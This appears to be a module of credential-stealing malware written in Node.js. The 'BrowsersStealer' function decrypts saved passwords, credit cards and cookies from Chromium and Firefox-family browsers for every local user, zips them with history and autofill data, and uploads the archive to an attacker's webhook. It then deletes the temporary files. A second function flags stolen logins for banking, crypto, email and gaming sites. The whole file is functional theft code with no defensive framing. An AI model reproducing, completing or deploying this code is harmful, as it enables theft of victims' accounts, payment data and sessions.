const os = require('os');
const fs = require('fs');
const path = require('path');

const structures = require('./structures.js');
const browsersPaths = require('./paths.js');

const requests = require('./../../utils/requests/requests.js');
const fileutil = require('./../../utils/fileutil/fileutil.js');
const hardware = require('./../../utils/hardware/hardware.js');

const browsersProfiles = require('./profiles.js');

const c = require('./chromium.js');
const chromium = new c.Chromium();

const g = require('./gecko.js');
const gecko = new g.Gecko();

const browsers = {
  downloads: [],
  historys: [],
  bookmarks: [],
  autofills: [],
  logins: [],
  creditcards: [],
  cookies: [],
};

const BrowserStats = structures.BrowserStatistics;

const Chromiumbrowsers = async () => {
  const profiles = [];
  const users = await hardware.GetUsers();

  for (const user of users) {
    for (const [name, relativePath] of Object.entries(browsersPaths.GetChromiumBrowsers())) {
      const fullPath = path.join(user, relativePath);

      if (!fs.existsSync(fullPath) || !fs.lstatSync(fullPath).isDirectory()) {
        continue;
      }

      const browser = {
        name: name,
        path: fullPath,
        user: user.split(path.sep)[2],
      };

      BrowserStats.AddUsers(user);

      let profilePaths = browsersProfiles.GetChromiumProfiles(fullPath, name).map((profile) => ({
        ...profile,
        browser: browser,
      }));

      const MasterKey = await chromium.GetMasterKey(fullPath);

      if (!MasterKey) {
        continue;
      }

      if (profilePaths.length === 0) {
        continue;
      }

      for (const profile of profilePaths) {
        profile.downloads = (await chromium.GetDownloads(profile.path)) || [];
        profile.historys = (await chromium.GetHistorys(profile.path)) || [];
        profile.bookmarks = (await chromium.GetBookmarks(profile.path)) || [];
        profile.autofills = (await chromium.GetAutofills(profile.path)) || [];
        profile.logins = (await chromium.GetLogins(profile.path, MasterKey)) || [];
        profile.creditcards = (await chromium.GetCreditCards(profile.path, MasterKey)) || [];
        profile.cookies = (await chromium.GetCookies(profile.path, MasterKey)) || [];
        profiles.push(profile);
      }
    }
  }

  return profiles;
};

const Geckobrowsers = async () => {
  const profiles = [];
  const users = await hardware.GetUsers();

  for (const user of users) {
    for (const [name, relativePath] of Object.entries(browsersPaths.GetGeckoBrowsers())) {
      const fullPath = path.join(user, relativePath);

      if (!fs.existsSync(fullPath) || !fs.lstatSync(fullPath).isDirectory()) {
        continue;
      }

      const browser = {
        name: name,
        path: fullPath,
        user: user.split(path.sep)[2],
      };

      let profilePaths = browsersProfiles.GetGeckoProfiles(fullPath, name).map((profile) => ({
        ...profile,
        browser: browser,
      }));

      if (profilePaths.length === 0) {
        continue;
      }

      for (const profile of profilePaths) {
        const MasterKey = await gecko.GetMasterKey(profile.path, '');

        if (!MasterKey) {
          continue;
        }

        profile.downloads = (await gecko.GetDownloads(profile.path)) || [];
        profile.historys = (await gecko.GetHistorys(profile.path)) || [];
        profile.bookmarks = (await gecko.GetBookmarks(profile.path)) || [];
        profile.logins = (await gecko.GetLogins(profile.path, MasterKey)) || [];
        profile.cookies = (await gecko.GetCookies(profile.path)) || [];
        profiles.push(profile);
      }
    }
  }

  return profiles;
};

const BrowsersStealer = async (webhookUrl) => {
  const profiles = [...(await Chromiumbrowsers()), ...(await Geckobrowsers())];

  if (profiles.length === 0) {
    return [];
  }

  const browserTempDir = path.join(os.tmpdir(), 'browsers-temp');
  for (const profile of profiles) {
    const destBrowser = path.join(browserTempDir, profile.browser.user, profile.browser.name, profile.profile);

    if (!fs.existsSync(destBrowser)) {
      fs.mkdirSync(destBrowser, { recursive: true });
    }

    const profileInfo = {
      browserTempPath: destBrowser,
      user: profile.browser.user,
      browser: profile.browser.name,
      profile: profile.profile,
    };

    browsers.downloads.push({ ...profileInfo, downloads: profile?.downloads || [] });
    browsers.historys.push({ ...profileInfo, historys: profile?.historys || [] });
    browsers.bookmarks.push({ ...profileInfo, bookmarks: profile?.bookmarks || [] });
    browsers.autofills.push({ ...profileInfo, autofills: profile?.autofills || [] });
    browsers.logins.push({ ...profileInfo, logins: profile?.logins || [] });
    browsers.creditcards.push({ ...profileInfo, creditcards: profile?.creditcards || [] });
    browsers.cookies.push({ ...profileInfo, cookies: profile?.cookies || [] });
  }

  BrowserStats.UpdateStatistics(
    browsers.downloads.reduce((acc, { downloads }) => acc + downloads?.length, 0),
    browsers.historys.reduce((acc, { historys }) => acc + historys?.length, 0),
    browsers.bookmarks.reduce((acc, { bookmarks }) => acc + bookmarks?.length, 0),
    browsers.autofills.reduce((acc, { autofills }) => acc + autofills?.length, 0),
    browsers.logins.reduce((acc, { logins }) => acc + logins?.length, 0),
    browsers.creditcards.reduce((acc, { creditcards }) => acc + creditcards?.length, 0),
    browsers.cookies.reduce((acc, { cookies }) => acc + cookies?.length, 0)
  );

  for (const { browserTempPath, downloads } of browsers.downloads) {
    await fileutil.WriteDataToFile(browserTempPath, `downloads.txt`, downloads);
  }

  for (const { browserTempPath, historys } of browsers.historys) {
    await fileutil.WriteDataToFile(browserTempPath, `historys.txt`, historys);
  }

  for (const { browserTempPath, bookmarks } of browsers.bookmarks) {
    await fileutil.WriteDataToFile(browserTempPath, `bookmarks.txt`, bookmarks);
  }

  for (const { browserTempPath, autofills } of browsers.autofills) {
    await fileutil.WriteDataToFile(browserTempPath, `autofills.txt`, autofills);
  }

  for (const { browserTempPath, logins } of browsers.logins) {
    await fileutil.WriteDataToFile(browserTempPath, `logins.txt`, logins);
  }

  for (const { browserTempPath, creditcards } of browsers.creditcards) {
    await fileutil.WriteDataToFile(browserTempPath, `credit_cards.txt`, creditcards);
  }

  for (const { browserTempPath, browser, cookies } of browsers.cookies) {
    await fileutil.WriteDataToFile(browserTempPath, `cookies_${browser.toLowerCase()}.txt`, cookies);
  }

  const browserTempZip = path.join(os.tmpdir(), 'browsers.zip');

  try {
    await fileutil.ZipDirectory({
      inputDir: browserTempDir,
      outputZip: browserTempZip,
    });

    await requests.Webhook(
      webhookUrl,
      {
        embeds: [
          {
            title: 'Browsers',
            description: '```' + fileutil.Tree(browserTempDir) + '```',
          },
        ],
      },
      [browserTempZip]
    );

    const WishTempDir = fileutil.WishTempDir('browsers');
    await fileutil.Copy(browserTempDir, WishTempDir);

    [browserTempDir, browserTempZip].forEach(async (dir) => {
      await fileutil.RemoveDir(dir);
    });
  } catch (error) {
    console.error(error);
  }
};

const KeywordsFound = async (webhookUrl) => {
  const sites = new Set(['replit', 'hostinger', 'cloudflare', 'origin', 'amazon', 'twitter', 'aliexpress', 'netflix', 'roblox', 'twitch', 'facebook', 'riotgames', 'card', 'github', 'telegram', 'protonmail', 'gmail', 'youtube', 'onoff', 'xss.is', 'pronote', 'ovhcloud', 'nulled', 'cracked', 'tiktok', 'yahoo', 'gmx', 'aol', 'coinbase', 'binance', 'steam', 'epicgames', 'discord', 'paypal', 'instagram', 'spotify', 'onlyfans', 'pornhub']);

  const logins = new Set();
  const cookies = new Set();

  structures.BrowserStatistics.sites.forEach(({ origin_url, source }) => {
    const match = origin_url.match(/(?:https?:\/\/)?(?:www\.)?([^\/]+)(.*)/);

    if (match) {
      const domain = match[1].split('.').slice(-2).join('.');

      if (sites.has(domain)) {
        (source === 'logins' ? logins : cookies).add(domain);
      }
    }
  });

  const Field = (name, items) =>
    items.size > 0 && {
      name: name,
      value: Array.from(items)
        .map((x) => `[${x}](https://${x})`)
        .join(', '),
      inline: false,
    };

  try {
    const fields = ['Logins', 'Cookies'].map((label, index) => Field(label, index === 0 ? logins : cookies)).filter(Boolean);

    if (fields.length) {
      await requests.Webhook(webhookUrl, {
        embeds: [
          {
            title: 'Keywords',
            fields: fields,
          },
        ],
      });
    }
  } catch (error) {
    console.error(error);
  }
};

const SessionsFound = require('./sessions.js');

module.exports = async (webhookUrl) => {
  await BrowsersStealer(webhookUrl);
  await KeywordsFound(webhookUrl);
  await SessionsFound(webhookUrl);
};
